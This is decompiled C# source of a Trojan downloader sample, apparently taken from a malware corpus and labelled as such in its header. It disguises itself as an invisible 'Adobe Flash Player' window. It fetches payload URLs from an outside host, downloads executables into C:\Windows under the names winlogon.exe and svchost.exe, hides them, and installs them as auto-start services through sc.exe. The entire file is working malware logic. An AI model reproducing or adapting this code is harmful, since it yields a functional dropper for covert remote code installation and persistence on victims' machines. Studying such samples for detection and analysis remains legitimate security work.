// Decompiled with JetBrains decompiler
// Type: flashplayer.flashplayer
// Assembly: flashplayer, Version=11.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 06BDE18B-52D6-4D54-8321-212AE21F05B1
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Trojan-Downloader.MSIL.Crypted.fr-9dcecd19b8e10f34e5fd424de314a4ff4f6a655715e6a2e6edd2182937dc1026.exe

using aCAxGo8jUjXrWCMv1a;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace flashplayer
{
  public class flashplayer : Form
  {
    private IContainer rhr8MwsXX;
    private System.Windows.Forms.Timer jSZH6NfAg;
    private System.Windows.Forms.Timer FVGgJSVgX;
    private System.Windows.Forms.Timer cvEvrgwU8;
    private Stream sfcihQqTU;
    private Stream PSNMyh1T1;

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void Dispose(bool disposing)
    {
      if (disposing && this.rhr8MwsXX != null)
        this.rhr8MwsXX.Dispose();
      base.Dispose(disposing);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void pSZxv6lnj()
    {
      this.rhr8MwsXX = (IContainer) new Container();
      this.jSZH6NfAg = new System.Windows.Forms.Timer(this.rhr8MwsXX);
      this.FVGgJSVgX = new System.Windows.Forms.Timer(this.rhr8MwsXX);
      this.cvEvrgwU8 = new System.Windows.Forms.Timer(this.rhr8MwsXX);
      this.SuspendLayout();
      this.jSZH6NfAg.Interval = 10000;
      this.jSZH6NfAg.Tick += new EventHandler(this.favdDnNWe);
      this.FVGgJSVgX.Interval = 10000;
      this.FVGgJSVgX.Tick += new EventHandler(this.uYyIT7TbH);
      this.cvEvrgwU8.Enabled = true;
      this.cvEvrgwU8.Interval = 300000;
      this.cvEvrgwU8.Tick += new EventHandler(this.gfIYX6xbk);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(10, 10);
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (flashplayer);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "Adobe Flash Player";
      this.WindowState = FormWindowState.Minimized;
      this.Load += new EventHandler(this.aTBAcw4hZ);
      this.ResumeLayout(false);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public flashplayer()
    {
      F6gnBCYuM3Gh9uSkf3.c3FUJW0tbGb2O();
      this.rhr8MwsXX = (IContainer) null;
      // ISSUE: explicit constructor call
      base.\u002Ector();
      this.pSZxv6lnj();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void favdDnNWe([In] object obj0, [In] EventArgs obj1)
    {
      this.WMHCj1f8O();
      this.jSZH6NfAg.Stop();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void uYyIT7TbH([In] object obj0, [In] EventArgs obj1)
    {
      this.HYwqFWcrF();
      this.FVGgJSVgX.Stop();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void Configure(string name, string displayName, string binPath, string startupType)
    {
      string empty = string.Empty;
      string str;
      switch (startupType)
      {
        case "Automatic":
          str = "auto";
          break;
        case "Disabled":
          str = "disabled";
          break;
        case "Manual":
          str = "demand";
          break;
        default:
          str = "auto";
          break;
      }
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.AppendFormat("{0} {1} ", (object) "Create", (object) name);
      stringBuilder.AppendFormat("binPath= \"{0}\"  ", (object) binPath);
      stringBuilder.AppendFormat("displayName= \"{0}\"  ", (object) displayName);
      stringBuilder.AppendFormat("start= \"{0}\"  ", (object) str);
      using (Process process = new Process())
      {
        process.StartInfo.FileName = "sc.exe";
        process.StartInfo.Arguments = stringBuilder.ToString();
        process.StartInfo.CreateNoWindow = true;
        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        process.Start();
        process.WaitForExit();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void WMHCj1f8O()
    {
      using (WebClient webClient = new WebClient())
      {
        try
        {
          string address = this.i0sQfPXB6();
          if (!(address != "baglanmadi"))
            return;
          this.sfcihQqTU = webClient.OpenRead(address);
          this.PSNMyh1T1 = (Stream) new FileStream("C:\\Windows\\winlogon.exe", FileMode.Create, FileAccess.Write, FileShare.None);
          byte[] buffer = new byte[2048];
          int count;
          while ((count = this.sfcihQqTU.Read(buffer, 0, buffer.Length)) > 0)
            this.PSNMyh1T1.Write(buffer, 0, count);
          this.sfcihQqTU.Close();
          this.PSNMyh1T1.Close();
          System.IO.File.SetAttributes("C:\\Windows\\winlogon.exe", FileAttributes.Hidden);
          this.Configure("winlogon", "winlogon", "C:\\Windows\\winlogon.exe", "auto");
        }
        catch
        {
        }
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private string i0sQfPXB6()
    {
      try
      {
        StreamReader streamReader = new StreamReader(WebRequest.Create("http://www.flash-indir.com/download.txt").GetResponse().GetResponseStream());
        string str1 = string.Empty;
        for (string str2 = streamReader.ReadLine(); str2 != null; str2 = streamReader.ReadLine())
        {
          Console.WriteLine(str2);
          if (str2 != null && str2 != string.Empty)
            str1 = str2;
        }
        streamReader.Close();
        return str1;
      }
      catch
      {
        return "baglanmadi";
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private string mQd5afXFG()
    {
      try
      {
        StreamReader streamReader = new StreamReader(WebRequest.Create("http://www.flash-indir.com/indir.txt").GetResponse().GetResponseStream());
        string str1 = string.Empty;
        for (string str2 = streamReader.ReadLine(); str2 != null; str2 = streamReader.ReadLine())
        {
          Console.WriteLine(str2);
          if (str2 != null && str2 != string.Empty)
            str1 = str2;
        }
        streamReader.Close();
        return str1;
      }
      catch
      {
        return "baglanmadi";
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void HYwqFWcrF()
    {
      using (WebClient webClient = new WebClient())
      {
        try
        {
          string address = this.mQd5afXFG();
          if (!(address != "baglanmadi"))
            return;
          this.sfcihQqTU = webClient.OpenRead(address);
          this.PSNMyh1T1 = (Stream) new FileStream("C:\\Windows\\svchost.exe", FileMode.Create, FileAccess.Write, FileShare.None);
          byte[] buffer = new byte[2048];
          int count;
          while ((count = this.sfcihQqTU.Read(buffer, 0, buffer.Length)) > 0)
            this.PSNMyh1T1.Write(buffer, 0, count);
          this.sfcihQqTU.Close();
          this.PSNMyh1T1.Close();
          System.IO.File.SetAttributes("C:\\Windows\\svchost.exe", FileAttributes.Hidden);
          this.Configure("svchost", "svchost", "C:\\Windows\\svchost.exe", "auto");
        }
        catch
        {
        }
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void aTBAcw4hZ([In] object obj0, [In] EventArgs obj1)
    {
      this.Visible = false;
      this.Hide();
      if (!System.IO.File.Exists("C:\\Windows\\csrss.exe"))
        this.jSZH6NfAg.Start();
      if (System.IO.File.Exists("C:\\Windows\\svchost.exe"))
        return;
      this.FVGgJSVgX.Start();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void gfIYX6xbk([In] object obj0, [In] EventArgs obj1) => Application.Exit();
  }
}
